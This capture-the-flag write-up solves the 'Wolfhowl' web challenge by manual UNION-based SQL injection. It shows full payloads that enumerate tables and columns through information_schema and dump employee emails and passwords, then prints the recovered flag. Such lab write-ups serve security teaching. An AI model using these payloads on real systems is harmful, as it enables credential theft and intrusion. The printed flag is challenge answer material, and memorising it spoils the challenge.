# Wolfhowl
> Log into WolfHowl to get the flag

## About the Challenge
We are given a website and has multiple functionalities such as search feature, login and register user (But in this case, this feature has been disabled)


[Image extracted text: Enter an Artist to Look Up
Search
Sign up
Log in
yol @he
ter
Ikat yollisten to
NC State's Premiere Audio Streaming Servicel
Search your favorite artists like Ozzy Osbourne to see our selection]


## How to Solve?
There is a SQL injection vulnerability in the search feature, but I couldn't use SQLMap to exploit it. Therefore, in this case, I resolved this challenge using a manual approach. First I find the table name first using this payload
```
" union select table_name,2,3,4 from information_schema.tables-- -
```


[Image extracted text: Enter an Artist to Look Up
Search
up
Log in
Artist: album
Artist: artist
Artist: customer
Artist: employee
Album: 2
Album: 2
Album: 2
Album: 2
Track: 3
Track: 3
Track: 3
Track: 3
Listen
Listen
Listen
Listen
Artist: genre
Artist: invoice
Artist: invoiceline
Artist: mediatype
Album: 2
Album: 2
Album: 2
Album: 2
Track: 3
Track: 3
Track: 3
Track: 3
Listen
Listen
Listen
Listen
Sign]


As you can see, there are many tables, but in this case, we will choose the `employee` table. Now, I would like to know the column names in the `employee` table

```
" union select concat(column_name),2,3,4 from information_schema.columns where table_name=0x656d706c6f796565-- -
```


[Image extracted text: Enter an Artist to Look Up
Search
up
Log in
Artist: Employeeld
Artist: LastName
Artist: FirstName
Artist: Title
Album: 2
Album: 2
Album: 2
Album: 2
Track: 3
Track: 3
Track: 3
Track: 3
Listen
Listen
Listen
Listen
Artist: ReportsTo
Artist: BirthDate
Artist: HireDate
Artist: Address
Album: 2
Album: 2
Album: 2
Album: 2
Track: 3
Track: 3
Track: 3
Track: 3
Listen
Listen
Listen
Listen
Sign]


Now, we need to extract the `email` and `password` columns, as we require the credentials to log in to the website.

```
" union select concat(email,password),2,3,4 from employee-- -
```


[Image extracted text: Artist:
Artist:
Artist:
Artist:
andrew@chinookcorp comPASS
nancyc
chinookcorp comShirley
jane@chinookcorp.comDawnoft
margaret@chinookcorp.comwha
WORD
Temple
heDead
tnot
Album: 2
Album: 2
Album: 2
Album: 2
Track: 3
Track: 3
Track: 3
Track: 3
Listen
Listen
Listen
Listen
Artist:
Artist:
Artist:
Artist:
steve@chinookcorp comhunter2
michael@chinookcorpcombubb
robert@chinookcorp comUpUp
laura@chinookcorp.comrochelle
2
les
DownDownLeftRightLeftRightAB
123
Album: 2
Album: 2
Album: 2
Album: 2
Track: 3
Track: 3
Track: 3
Track: 3]


And then login using one of the credential that has been exposed using SQL injection payload to obtain the flag


[Image extracted text: Oops.
flag{art_decorates_space_but_music_decorates_time}
Please be sure to support your favorite creators!
WolfHowl
NC State's Premiere Audio Streaming Service by
You Are What You Listen To by Mohammad Metri]


```
flag{art_decorates_space_but_music_decorates_time}
```